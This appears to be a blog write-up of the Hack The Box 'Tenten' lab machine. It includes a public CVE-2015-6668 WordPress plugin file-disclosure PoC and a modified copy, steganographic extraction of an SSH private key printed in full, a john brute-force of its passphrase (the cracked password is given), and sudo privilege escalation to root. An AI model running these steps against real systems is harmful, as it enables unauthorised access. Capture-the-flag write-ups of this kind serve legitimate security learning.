@@ -1,0 +1,449 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  <title>nullarmor | Tenten - Hack The Box</title>
+  <meta name="description" content="Resolution of the Tenten machine">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  <meta property="og:title" content="Tenten - Hack The Box">
+  <meta property="og:type" content="website">
+  <meta property="og:url" content="https://nullarmor.github.io/posts/tenten">
+  <meta property="og:description" content="Resolution of the Tenten machine">
+  <meta property="og:site_name" content="nullarmor">
+
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:url" content="https://nullarmor.github.io/posts/tenten">
+  <meta name="twitter:title" content="Tenten - Hack The Box">
+  <meta name="twitter:description" content="Resolution of the Tenten machine">
+  <meta name="google-site-verification" content="1sfOj2zDu7c444806MBQqbqFzNWxik880zgryQLMj-o" />
+
+  
+    
+      <meta property="og:image" content="https://nullarmor.github.io/assets/hackthebox/tenten/tenten-00-f9873b60d5fcf0074bc11ae501f9971c4ac45be527fa859db780031056560323.png">
+      <meta name="twitter:image" content="https://nullarmor.github.io/assets/hackthebox/tenten/tenten-00-f9873b60d5fcf0074bc11ae501f9971c4ac45be527fa859db780031056560323.png">
+    
+  
+
+  <link href="https://nullarmor.github.io/feed.xml" type="application/rss+xml" rel="alternate" title="nullarmor Last 10 blog posts" />
+
+  
+
+  
+
+    
+      <link rel="icon" type="image/x-icon" href="/assets/favicon-5df081ea197cddd592e345971da85e359e2f613dae2506c368835a695a297f82.gif">
+      <link rel="apple-touch-icon" href="/assets/favicon-5df081ea197cddd592e345971da85e359e2f613dae2506c368835a695a297f82.gif">
+      <link rel="stylesheet" type="text/css" title="light" id="light" href="/assets/light-fd3e34295723b96a04f635903b3650e5bb101ebdcc4d959165c3b4d2d88abe5e.css">
+      <link rel="stylesheet" type="text/css" title="dark" id="dark" href="/assets/dark-0f2545b8bdef934d32dd563b17074c614e7f4f4d5c3e682d4089a07fed36aa84.css" disabled="false">
+    
+
+  
+
+</head>
+
+<body>
+  <main>
+    <div class="grid grid-centered">
+      <div class="grid-cell">
+        <nav class="header-nav scrollappear">
+  <a href="/" class="header-logo" title="nullarmor">nullarmor</a>
+  <ul class="header-links">
+    
+      <li>
+        <a href="/about" title="About me">
+          <svg xmlns="http://www.w3.org/2000/svg" class="icon-about">
+  <use href="/assets/about-ecf154b571ab8034ae00aeed91a3b7ad68db80b46d958753ad6216c919486e88.svg#icon-about" xlink:href="/assets/about-ecf154b571ab8034ae00aeed91a3b7ad68db80b46d958753ad6216c919486e88.svg#icon-about"></use>
+</svg>
+
+        </a>
+      </li>
+    
+    
+      <li>
+        <a href="https://twitter.com/nullarmor" rel="noreferrer noopener" target="_blank" title="Twitter">
+          <svg xmlns="http://www.w3.org/2000/svg" class="icon-twitter">
+  <use href="/assets/twitter-8842c33965263ad1b03a978406826677a668f94125d5837e70ab83f24b3213a7.svg#icon-twitter" xlink:href="/assets/twitter-8842c33965263ad1b03a978406826677a668f94125d5837e70ab83f24b3213a7.svg#icon-twitter"></use>
+</svg>
+
+        </a>
+      </li>
+    
+    
+    
+    
+      <li>
+        <a href="https://github.com/nullarmor" rel="noreferrer noopener" target="_blank" title="GitHub">
+          <svg xmlns="http://www.w3.org/2000/svg" class="icon-github">
+  <use href="/assets/github-094f81040819f34343ee6ffff0980f17e2807b08b595eaaf66ae3554934fd78d.svg#icon-github" xlink:href="/assets/github-094f81040819f34343ee6ffff0980f17e2807b08b595eaaf66ae3554934fd78d.svg#icon-github"></use>
+</svg>
+
+        </a>
+      </li>
+    
+    
+    
+    
+    
+    
+    
+      <li>
+        <a href="https://www.linkedin.com/in/renan-almeida-8137a81a6" rel="noreferrer noopener" target="_blank" title="LinkedIn">
+          <svg xmlns="http://www.w3.org/2000/svg" class="icon-linkedin">
+  <use href="/assets/linkedin-cdc5c107044324a3dfbea2e9ead15873f8dee304c37d73a046988956b706256e.svg#icon-linkedin" xlink:href="/assets/linkedin-cdc5c107044324a3dfbea2e9ead15873f8dee304c37d73a046988956b706256e.svg#icon-linkedin"></use>
+</svg>
+
+        </a>
+      </li>
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+      <li>
+        <a href="mailto:nullarmor@protonmail.com" title="Email">
+          <svg xmlns="http://www.w3.org/2000/svg" class="icon-email">
+  <use href="/assets/email-782473193bf750036fdb90e8daa075508a20509d01854c09f3237c144a3f0601.svg#icon-email" xlink:href="/assets/email-782473193bf750036fdb90e8daa075508a20509d01854c09f3237c144a3f0601.svg#icon-email"></use>
+</svg>
+
+        </a>
+      </li>
+    
+    
+    
+      <li>
+        <a onclick="toggle()" title="Toggle Theme">
+          <svg xmlns="http://www.w3.org/2000/svg" class="icon-theme">
+  <use href="/assets/theme-66869e0bf8dab34bae1c86bda400327b772e0be69e8dc28d3ede896e771320ed.svg#icon-theme" xlink:href="/assets/theme-66869e0bf8dab34bae1c86bda400327b772e0be69e8dc28d3ede896e771320ed.svg#icon-theme"></use>
+</svg>
+
+        </a>
+      </li>
+    
+  </ul>
+</nav>
+
+
+  <ul class="header-tags scrollappear">
+    
+    
+      
+        <li><a href="/tag/ctf">Ctf</a></li>
+    
+      
+        <li><a href="/tag/cybrics">Cybrics</a></li>
+    
+      
+        <li><a href="/tag/hackthebox">Hackthebox</a></li>
+    
+      
+        <li><a href="/tag/hacktivitycon">Hacktivitycon</a></li>
+    
+      
+        <li><a href="/tag/pwn">Pwn</a></li>
+    
+      
+        <li><a href="/tag/rev">Rev</a></li>
+    
+      
+        <li><a href="/tag/rgbctf">Rgbctf</a></li>
+    
+      
+        <li><a href="/tag/web">Web</a></li>
+    
+  </ul>
+
+
+        <article class="article scrollappear">
+          <header class="article-header">
+            <h1>Tenten - Hack The Box</h1>
+            <p>Resolution of the Tenten machine</p>
+            <div class="article-list-footer">
+  <span class="article-list-date">
+    July 4, 2020
+  </span>
+  <span class="article-list-divider">-</span>
+  <span class="article-list-minutes">
+    
+    
+      5 minute read
+    
+  </span>
+  <span class="article-list-divider">-</span>
+  <div class="article-list-tags">
+    
+      
+      <a href="/tag/hackthebox" title="See all posts with tag 'HackTheBox'">HackTheBox</a>
+    
+  </div>
+</div>
+          </header>
+
+          <div class="article-content">
+            <p><a href="/assets/hackthebox/tenten/tenten-00-f9873b60d5fcf0074bc11ae501f9971c4ac45be527fa859db780031056560323.png">
+  <img src="/assets/hackthebox/tenten/tenten-00-f9873b60d5fcf0074bc11ae501f9971c4ac45be527fa859db780031056560323.png" alt="Tenten banner" class="zooming" data-rjs="/assets/hackthebox/tenten/tenten-00-f9873b60d5fcf0074bc11ae501f9971c4ac45be527fa859db780031056560323.png" data-zooming-width="596" data-zooming-height="380" />
+</a></p>
+
+<p>Tenten is a medium level machine based on Linux, the initial approach is heavily based on <code class="highlighter-rouge">web enumeration</code>. The entire machine has a <code class="highlighter-rouge">CTF style</code> that requires some <code class="highlighter-rouge">guessing</code>, <code class="highlighter-rouge">steganography</code> and avoid <code class="highlighter-rouge">rabbit holes</code>.
+The privilege escalation process is pretty easy.</p>
+
+<h1 id="recon">Recon</h1>
+
+<figure class="highlight"><pre><code class="language-shell" data-lang="shell"><span class="c"># Nmap 7.80 scan initiated Sun May 10 15:26:04 2020 as: nmap -sC -sV -T5 --min-parallelism=50 -n --min-rate=300 -p- -oA tenten 10.10.10.10</span>
+Nmap scan report <span class="k">for </span>10.10.10.10
+Host is up <span class="o">(</span>0.15s latency<span class="o">)</span><span class="nb">.</span>
+Not shown: 65533 filtered ports
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
+| ssh-hostkey: 
+|   2048 ec:f7:9d:38:0c:47:6f:f0:13:0f:b9:3b:d4:d6:e3:11 <span class="o">(</span>RSA<span class="o">)</span>
+|   256 cc:fe:2d:e2:7f:ef:4d:41:ae:39:0e:91:ed:7e:9d:e7 <span class="o">(</span>ECDSA<span class="o">)</span>
+|_  256 8d:b5:83:18:c0:7c:5d:3d:38:df:4b:e1:a4:82:8a:07 <span class="o">(</span>ED25519<span class="o">)</span>
+80/tcp open  http    Apache httpd 2.4.18 <span class="o">((</span>Ubuntu<span class="o">))</span>
+|_http-generator: WordPress 4.7.3
+|_http-server-header: Apache/2.4.18 <span class="o">(</span>Ubuntu<span class="o">)</span>
+|_http-title: Job Portal &amp;#8211<span class="p">;</span> Just another WordPress site
+Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>
+<span class="c"># Nmap done at Sun May 10 15:28:28 2020 -- 1 IP address (1 host up) scanned in 144.09 seconds</span></code></pre></figure>
+
+<p>The port 80 has a WordPress page:</p>
+
+<p><a href="/assets/hackthebox/tenten/tenten-01-a58285b17291a10fbe6a6d4e10462298dc7d5fc2d013de8ff5eaa37f260b931f.png">
+  <img src="/assets/hackthebox/tenten/tenten-01-a58285b17291a10fbe6a6d4e10462298dc7d5fc2d013de8ff5eaa37f260b931f.png" alt="Tenten Recon" class="zooming" data-rjs="/assets/hackthebox/tenten/tenten-01-a58285b17291a10fbe6a6d4e10462298dc7d5fc2d013de8ff5eaa37f260b931f.png" data-zooming-width="1271" data-zooming-height="554" />
+</a></p>
+
+<p>On <code class="highlighter-rouge">Job Listing</code> there’s only one job available:</p>
+
+<p><a href="/assets/hackthebox/tenten/tenten-02-939cd7154214d2b0dfec108f004ee4e699ffb0527339a9f44f88ebea98301cc0.png">
+  <img src="/assets/hackthebox/tenten/tenten-02-939cd7154214d2b0dfec108f004ee4e699ffb0527339a9f44f88ebea98301cc0.png" alt="Tenten Recon" class="zooming" data-rjs="/assets/hackthebox/tenten/tenten-02-939cd7154214d2b0dfec108f004ee4e699ffb0527339a9f44f88ebea98301cc0.png" data-zooming-width="904" data-zooming-height="540" />
+</a></p>
+
+<p>I recommend a tool named <code class="highlighter-rouge">WPScan</code> that identifies possible vulnerabilities:</p>
+
+<p><a href="/assets/hackthebox/tenten/tenten-03-2773b144a0f200266fcc959aa6447a1afb066ac05c85f3917f57938424fb8aac.png">
+  <img src="/assets/hackthebox/tenten/tenten-03-2773b144a0f200266fcc959aa6447a1afb066ac05c85f3917f57938424fb8aac.png" alt="Tenten Recon" class="zooming" data-rjs="/assets/hackthebox/tenten/tenten-03-2773b144a0f200266fcc959aa6447a1afb066ac05c85f3917f57938424fb8aac.png" data-zooming-width="721" data-zooming-height="306" />
+</a></p>
+
+<h1 id="exploiting---vulnerable-wordpress-plugins">Exploiting - Vulnerable WordPress plugins</h1>
+
+<p>There’s an interesting vulnerable WP plugin (<code class="highlighter-rouge">CVE-2015-6668</code>) with a PoC on GitHub: <a href="https://gist.githubusercontent.com/DoMINAToR98/4ed677db5832e4b4db41c9fa48e7bdef/raw/b73055d21285904c836ea19ce242efe844c74e45/exploit.py" target="_blank">CV filename disclosure on Job-Manager WP Plugin</a></p>
+
+<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="kn">import</span> <span class="nn">requests</span>
+
+<span class="k">print</span> <span class="s">"""  
+CVE-2015-6668  
+Title: CV filename disclosure on Job-Manager WP Plugin  
+Author: Evangelos Mourikis  
+Blog: https://vagmour.eu  
+Plugin URL: http://www.wp-jobmanager.com  
+Versions: &lt;=0.7.25  
+"""</span>  
+<span class="n">website</span> <span class="o">=</span> <span class="nb">raw_input</span><span class="p">(</span><span class="s">'Enter a vulnerable website: '</span><span class="p">)</span>  
+<span class="n">filename</span> <span class="o">=</span> <span class="nb">raw_input</span><span class="p">(</span><span class="s">'Enter a file name: '</span><span class="p">)</span>
+
+<span class="n">filename2</span> <span class="o">=</span> <span class="n">filename</span><span class="p">.</span><span class="n">replace</span><span class="p">(</span><span class="s">" "</span><span class="p">,</span> <span class="s">"-"</span><span class="p">)</span>
+
+<span class="k">for</span> <span class="n">year</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">2017</span><span class="p">,</span><span class="mi">2019</span><span class="p">):</span>  
+    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">13</span><span class="p">):</span>
+        <span class="k">for</span> <span class="n">extension</span> <span class="ow">in</span> <span class="p">{</span><span class="s">'jpeg'</span><span class="p">,</span><span class="s">'png'</span><span class="p">,</span><span class="s">'jpg'</span><span class="p">}:</span>
+            <span class="n">URL</span> <span class="o">=</span> <span class="n">website</span> <span class="o">+</span> <span class="s">"/wp-content/uploads/"</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">year</span><span class="p">)</span> <span class="o">+</span> <span class="s">"/"</span> <span class="o">+</span> <span class="s">"{:02}"</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">i</span><span class="p">)</span> <span class="o">+</span> <span class="s">"/"</span> <span class="o">+</span> <span class="n">filename2</span> <span class="o">+</span> <span class="s">"."</span> <span class="o">+</span> <span class="n">extension</span>
+            <span class="n">req</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="n">URL</span><span class="p">)</span>
+            <span class="k">if</span> <span class="n">req</span><span class="p">.</span><span class="n">status_code</span><span class="o">==</span><span class="mi">200</span><span class="p">:</span>
+                <span class="k">print</span> <span class="s">"[+] URL of CV found! "</span> <span class="o">+</span> <span class="n">URL</span></code></pre></figure>
+
+<p>This exploit uses a vulnerability named <code class="highlighter-rouge">IDOR</code> and a technique named <code class="highlighter-rouge">fuzzing</code> to locate the hosted file located at the <code class="highlighter-rouge">WP uploads</code> using a range of dates and some file extensions.</p>
+
+<p>It’s possible to search for other jobs by just <code class="highlighter-rouge">modifying the job id</code> in the URL:</p>
+
+<p>From <code class="highlighter-rouge">jobs/apply/8/</code> to <code class="highlighter-rouge">jobs/apply/10/</code>, for example.</p>
+
+<p>After a manual fuzz, we found an interesting job named <code class="highlighter-rouge">HackerAccessGranted</code>:</p>
+
+<p><a href="/assets/hackthebox/tenten/tenten-04-28900d399e2245f843e0d06eea23ef0df82d2599c564bef3c17ee6dc4c632f64.png">
+  <img src="/assets/hackthebox/tenten/tenten-04-28900d399e2245f843e0d06eea23ef0df82d2599c564bef3c17ee6dc4c632f64.png" alt="Tenten Exploit" class="zooming" data-rjs="/assets/hackthebox/tenten/tenten-04-28900d399e2245f843e0d06eea23ef0df82d2599c564bef3c17ee6dc4c632f64.png" data-zooming-width="851" data-zooming-height="552" />
+</a></p>
+
+<p>I made a small script to map job ids:</p>
+
+<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="c1"># -*- coding:utf-8 -*-
+</span>
+<span class="kn">import</span> <span class="nn">requests</span>
+
+<span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
+    
+    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mi">100</span><span class="p">):</span>
+        <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="s">"http://10.10.10.10/?page_id={}"</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">i</span><span class="p">))</span>
+        
+        <span class="k">if</span> <span class="s">"page_id"</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">r</span><span class="p">.</span><span class="n">url</span><span class="p">:</span>
+            <span class="k">print</span><span class="p">(</span><span class="s">"http://10.10.10.10/?page_id={}"</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">i</span><span class="p">))</span>
+    
+<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">'__main__'</span><span class="p">:</span>
+    <span class="n">main</span><span class="p">()</span>    </code></pre></figure>
+
+<p>After that, we need to edit the PoC script:</p>
+
+<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="kn">import</span> <span class="nn">requests</span>
+
+<span class="k">print</span> <span class="s">"""  
+CVE-2015-6668  
+Title: CV filename disclosure on Job-Manager WP Plugin  
+Author: Evangelos Mourikis  
+Blog: https://vagmour.eu  
+Plugin URL: http://www.wp-jobmanager.com  
+Versions: &lt;=0.7.25  
+"""</span>  
+<span class="n">website</span> <span class="o">=</span> <span class="s">'http://10.10.10.10'</span>  
+<span class="n">filename</span> <span class="o">=</span> <span class="s">'HackerAccessGranted'</span>
+
+<span class="n">filename2</span> <span class="o">=</span> <span class="n">filename</span><span class="p">.</span><span class="n">replace</span><span class="p">(</span><span class="s">" "</span><span class="p">,</span> <span class="s">"-"</span><span class="p">)</span>
+
+<span class="k">for</span> <span class="n">year</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">2017</span><span class="p">,</span><span class="mi">2018</span><span class="p">):</span>  
+    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">13</span><span class="p">):</span>
+        <span class="k">for</span> <span class="n">extension</span> <span class="ow">in</span> <span class="p">{</span><span class="s">'php'</span><span class="p">,</span><span class="s">'html'</span><span class="p">,</span><span class="s">'pdf'</span><span class="p">,</span><span class="s">'png'</span><span class="p">,</span><span class="s">'gif'</span><span class="p">,</span><span class="s">'jpg'</span><span class="p">,</span><span class="s">'jpeg'</span><span class="p">}:</span>
+            <span class="n">URL</span> <span class="o">=</span> <span class="n">website</span> <span class="o">+</span> <span class="s">"/wp-content/uploads/"</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">year</span><span class="p">)</span> <span class="o">+</span> <span class="s">"/"</span> <span class="o">+</span> <span class="s">"{:02}"</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">i</span><span class="p">)</span> <span class="o">+</span> <span class="s">"/"</span> <span class="o">+</span> <span class="n">filename2</span> <span class="o">+</span> <span class="s">"."</span> <span class="o">+</span> <span class="n">extension</span>
+            <span class="n">req</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="n">URL</span><span class="p">)</span>
+            <span class="k">if</span> <span class="n">req</span><span class="p">.</span><span class="n">status_code</span><span class="o">==</span><span class="mi">200</span><span class="p">:</span>
+                <span class="k">print</span> <span class="s">"[+] URL of CV found! "</span> <span class="o">+</span> <span class="n">URL</span></code></pre></figure>
+
+<p>We just added a few extensions and changed the filename to HackerAccessGranted.
+Now we got the following output:</p>
+
+<p><a href="/assets/hackthebox/tenten/tenten-05-10c0769c84e4823a44761e359f4b2e0a7ae24ce95fa24d3062f1317a98f70baf.png">
+  <img src="/assets/hackthebox/tenten/tenten-05-10c0769c84e4823a44761e359f4b2e0a7ae24ce95fa24d3062f1317a98f70baf.png" alt="Tenten Exploit" class="zooming" data-rjs="/assets/hackthebox/tenten/tenten-05-10c0769c84e4823a44761e359f4b2e0a7ae24ce95fa24d3062f1317a98f70baf.png" data-zooming-width="668" data-zooming-height="153" />
+</a></p>
+
+<p>The image url reveals an enigmatic image:</p>
+
+<p><a href="/assets/hackthebox/tenten/tenten-06-a6fc00a198af885ae724095bf7ce60b02bd84caacf93e6e5d7b7007475190315.jpg">
+  <img src="/assets/hackthebox/tenten/tenten-06-a6fc00a198af885ae724095bf7ce60b02bd84caacf93e6e5d7b7007475190315.jpg" alt="Tenten Exploit" class="zooming" data-rjs="/assets/hackthebox/tenten/tenten-06-a6fc00a198af885ae724095bf7ce60b02bd84caacf93e6e5d7b7007475190315.jpg" data-zooming-width="1500" data-zooming-height="1001" />
+</a></p>
+
+<p>The image has some hidden informations, it’s a <code class="highlighter-rouge">steganography</code> technique.
+To check if a file has any hidden information, we can use the tool named <code class="highlighter-rouge">steghide</code>:</p>
+
+<figure class="highlight"><pre><code class="language-shell" data-lang="shell">steghide info HackerAccessGranted.jpg</code></pre></figure>
+
+<p><a href="/assets/hackthebox/tenten/tenten-07-656bd992e1cf915da8ac112876f7d13d1ffc4ffb15446dede868b0fb32a5d1f2.png">
+  <img src="/assets/hackthebox/tenten/tenten-07-656bd992e1cf915da8ac112876f7d13d1ffc4ffb15446dede868b0fb32a5d1f2.png" alt="Tenten Exploit" class="zooming" data-rjs="/assets/hackthebox/tenten/tenten-07-656bd992e1cf915da8ac112876f7d13d1ffc4ffb15446dede868b0fb32a5d1f2.png" data-zooming-width="387" data-zooming-height="153" />
+</a></p>
+
+<p>The image has a file named <code class="highlighter-rouge">id_rsa</code>, for our lucky we don’t need any password to extract it!</p>
+
+<figure class="highlight"><pre><code class="language-shell" data-lang="shell">steghide extract <span class="nt">-sf</span> HackerAccessGranted.jpg</code></pre></figure>
+
+<p>The id_rsa file has the following content:</p>
+
+<blockquote>
+  <p>—–BEGIN RSA PRIVATE KEY—– Proc-Type: 4,ENCRYPTED DEK-Info: AES-128-CBC,7265FC656C429769E4C1EEFC618E660C</p>
+
+  <p>/HXcUBOT3JhzblH7uF9Vh7faa76XHIdr/Ch0pDnJunjdmLS/laq1kulQ3/RF/Vax tjTzj/V5hBEcL5GcHv3esrODlS0jhML53lAprkpawfbvwbR+XxFIJuz7zLfd/vDo 1KuGrCrRRsipkyae5KiqlC137bmWK9aE/4c5X2yfVTOEeODdW0rAoTzGufWtThZf K2ny0iTGPndD7LMdm/o5O5As+ChDYFNphV1XDgfDzHgonKMC4iES7Jk8Gz20PJsm SdWCazF6pIEqhI4NQrnkd8kmKqzkpfWqZDz3+g6f49GYf97aM5TQgTday2oFqoXH WPhK3Cm0tMGqLZA01+oNuwXS0H53t9FG7GqU31wj7nAGWBpfGodGwedYde4zlOBP VbNulRMKOkErv/NCiGVRcK6k5Qtdbwforh+6bMjmKE6QvMXbesZtQ0gC9SJZ3lMT J0IY838HQZgOsSw1jDrxuPV2DUIYFR0W3kQrDVUym0BoxOwOf/MlTxvrC2wvbHqw AAniuEotb9oaz/Pfau3OO/DVzYkqI99VDX/YBIxd168qqZbXsM9s/aMCdVg7TJ1g 2gxElpV7U9kxil/RNdx5UASFpvFslmOn7CTZ6N44xiatQUHyV1NgpNCyjfEMzXMo 6FtWaVqbGStax1iMRC198Z0cRkX2VoTvTlhQw74rSPGPMEH+OSFksXp7Se/wCDMA pYZASVxl6oNWQK+pAj5z4WhaBSBEr8ZVmFfykuh4lo7Tsnxa9WNoWXo6X0FSOPMk tNpBbPPq15+M+dSZaObad9E/MnvBfaSKlvkn4epkB7n0VkO1ssLcecfxi+bWnGPm KowyqU6iuF28w1J9BtowgnWrUgtlqubmk0wkf+l08ig7koMyT9KfZegR7oF92xE9 4IWDTxfLy75o1DH0Rrm0f77D4HvNC2qQ0dYHkApd1dk4blcb71Fi5WF1B3RruygF 2GSreByXn5g915Ya82uC3O+ST5QBeY2pT8Bk2D6Ikmt6uIlLno0Skr3v9r6JT5J7 L0UtMgdUqf+35+cA70L/wIlP0E04U0aaGpscDg059DL88dzvIhyHg4Tlfd9xWtQS VxMzURTwEZ43jSxX94PLlwcxzLV6FfRVAKdbi6kACsgVeULiI+yAfPjIIyV0m1kv 5HV/bYJvVatGtmkNuMtuK7NOH8iE7kCDxCnPnPZa0nWoHDk4yd50RlzznkPna74r Xbo9FdNeLNmER/7GGdQARkpd52Uur08fIJW2wyS1bdgbBgw/G+puFAR8z7ipgj4W p9LoYqiuxaEbiD5zUzeOtKAKL/nfmzK82zbdPxMrv7TvHUSSWEUC4O9QKiB3amgf yWMjw3otH+ZLnBmy/fS6IVQ5OnV6rVhQ7+LRKe+qlYidzfp19lIL8UidbsBfWAzB 9Xk0sH5c1NQT6spo/nQM3UNIkkn+a7zKPJmetHsO4Ob3xKLiSpw5f35SRV+rF+mO vIUE1/YssXMO7TK6iBIXCuuOUtOpGiLxNVRIaJvbGmazLWCSyptk5fJhPLkhuK+J YoZn9FNAuRiYFL3rw+6qol+KoqzoPJJek6WHRy8OSE+8Dz1ysTLIPB6tGKn7EWnP</p>
+
+  <p>—–END RSA PRIVATE KEY—–</p>
+</blockquote>
+
+<p>It’s a private key that will be used to authenticate through SSH. Unfortunately, we need the password to see the private key’s content.</p>
+
+<p><a href="/assets/hackthebox/tenten/tenten-08-ba17cd4e2b1d8631faa60541b93d72019a7c85bb4c240dd4f06af69d259f5161.png">
+  <img src="/assets/hackthebox/tenten/tenten-08-ba17cd4e2b1d8631faa60541b93d72019a7c85bb4c240dd4f06af69d259f5161.png" alt="Tenten Exploit" class="zooming" data-rjs="/assets/hackthebox/tenten/tenten-08-ba17cd4e2b1d8631faa60541b93d72019a7c85bb4c240dd4f06af69d259f5161.png" data-zooming-width="498" data-zooming-height="432" />
+</a></p>
+
+<p>A <code class="highlighter-rouge">SSH's private key bruteforce</code> is necessary, <code class="highlighter-rouge">ssh2jonh</code> is a tool that translates the id_rsa’s content to john’s format.</p>
+
+<p><a href="https://fossies.org/linux/john/run/ssh2john.py" target="_blank">ssh2john.py</a></p>
+
+<figure class="highlight"><pre><code class="language-shell" data-lang="shell">python ssh2john.py id_rsa <span class="o">&gt;</span> id_rsa.hash</code></pre></figure>
+
+<p>After that, we use john to bruteforce using a wordlist:</p>
+
+<figure class="highlight"><pre><code class="language-shell" data-lang="shell">john id_rsa.hash <span class="nt">--wordlist</span><span class="o">=</span>/usr/share/wordlists/rockyou.txt</code></pre></figure>
+
+<p><a href="/assets/hackthebox/tenten/tenten-09-d49f80844677d2d5314c123341a307b3ecf92f3e4c8ca7321a589ce405a229f2.png">
+  <img src="/assets/hackthebox/tenten/tenten-09-d49f80844677d2d5314c123341a307b3ecf92f3e4c8ca7321a589ce405a229f2.png" alt="Tenten Exploit" class="zooming" data-rjs="/assets/hackthebox/tenten/tenten-09-d49f80844677d2d5314c123341a307b3ecf92f3e4c8ca7321a589ce405a229f2.png" data-zooming-width="602" data-zooming-height="166" />
+</a></p>
+
+<p>Done, <code class="highlighter-rouge">superpassword</code> is the private’s key password!
+Now we’re able to authenticate on SSH using this key:</p>
+
+<p><a href="/assets/hackthebox/tenten/tenten-10-832556a657b7127c55fa80c57488d7f5933b830d584aae7ed49f4284bafc130b.png">
+  <img src="/assets/hackthebox/tenten/tenten-10-832556a657b7127c55fa80c57488d7f5933b830d584aae7ed49f4284bafc130b.png" alt="Tenten Exploit" class="zooming" data-rjs="/assets/hackthebox/tenten/tenten-10-832556a657b7127c55fa80c57488d7f5933b830d584aae7ed49f4284bafc130b.png" data-zooming-width="554" data-zooming-height="278" />
+</a></p>
+
+<blockquote>
+  <p>takis user was spotted through the WordPress blog authors</p>
+</blockquote>
+
+<h1 id="post-exploitation---escalating-privileges-through-a-sudo-binary">Post Exploitation - Escalating privileges through a sudo binary</h1>
+
+<p>The privilege escalation process is pretty easy, we just need to list sudo permissions with <code class="highlighter-rouge">sudo -l</code> command.
+There’s an interesting binary named <code class="highlighter-rouge">fuckin</code> that executes anything as root user, everything we need to do is spawn a shell!</p>
+
+<p><a href="/assets/hackthebox/tenten/tenten-11-8bc799759805640ef4c44d4b639899ddc423a9fd2157af5aa9f4c1fd97acb9f6.png">
+  <img src="/assets/hackthebox/tenten/tenten-11-8bc799759805640ef4c44d4b639899ddc423a9fd2157af5aa9f4c1fd97acb9f6.png" alt="Tenten Post Exploitation" class="zooming" data-rjs="/assets/hackthebox/tenten/tenten-11-8bc799759805640ef4c44d4b639899ddc423a9fd2157af5aa9f4c1fd97acb9f6.png" data-zooming-width="827" data-zooming-height="175" />
+</a></p>
+
+
+          </div>
+          <div class="article-share">
+            
+            
+            <a href="https://twitter.com/home?status=Tenten+-+Hack+The+Box%20-%20https://nullarmor.github.io/posts/tenten%20by%20@nullarmor" title="Share on Twitter" rel="noreferrer noopener" target="_blank">
+              <svg viewBox="0 0 512 512"><path d="M492 109.5c-17.4 7.7-36 12.9-55.6 15.3 20-12 35.4-31 42.6-53.6 -18.7 11.1-39.4 19.2-61.5 23.5C399.8 75.8 374.6 64 346.8 64c-53.5 0-96.8 43.4-96.8 96.9 0 7.6 0.8 15 2.5 22.1 -80.5-4-151.9-42.6-199.6-101.3 -8.3 14.3-13.1 31-13.1 48.7 0 33.6 17.2 63.3 43.2 80.7C67 210.7 52 206.3 39 199c0 0.4 0 0.8 0 1.2 0 47 33.4 86.1 77.7 95 -8.1 2.2-16.7 3.4-25.5 3.4 -6.2 0-12.3-0.6-18.2-1.8 12.3 38.5 48.1 66.5 90.5 67.3 -33.1 26-74.9 41.5-120.3 41.5 -7.8 0-15.5-0.5-23.1-1.4C62.8 432 113.7 448 168.3 448 346.6 448 444 300.3 444 172.2c0-4.2-0.1-8.4-0.3-12.5C462.6 146 479 129 492 109.5z"/></svg>
+            </a>
+            <a href="https://www.facebook.com/sharer/sharer.php?u=https://nullarmor.github.io/posts/tenten" title="Share on Facebook" rel="noreferrer noopener" target="_blank">
+              <svg viewBox="0 0 512 512"><path d="M288 192v-38.1c0-17.2 3.8-25.9 30.5-25.9H352V64h-55.9c-68.5 0-91.1 31.4-91.1 85.3V192h-45v64h45v192h83V256h56.4l7.6-64H288z"/></svg>
+            </a>
+          </div>
+
+          
+            <div id="disqus_thread" class="article-comments"></div>
+            <script src="https://nullarmor.disqus.com/embed.js" async defer></script>
+            <noscript>Please enable JavaScript to view the comments.</noscript>
+          
+        </article>
+        <footer class="footer scrollappear">
+  <p>
+    This site uses Chalk theme made by Nielsen Ramon.
+  </p>
+</footer>
+
+      </div>
+    </div>
+  </main>
+  
+  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-159304176-1"></script>
+  <script>
+    window.dataLayer = window.dataLayer || [];
+    function gtag(){dataLayer.push(arguments);}
+    gtag('js', new Date());
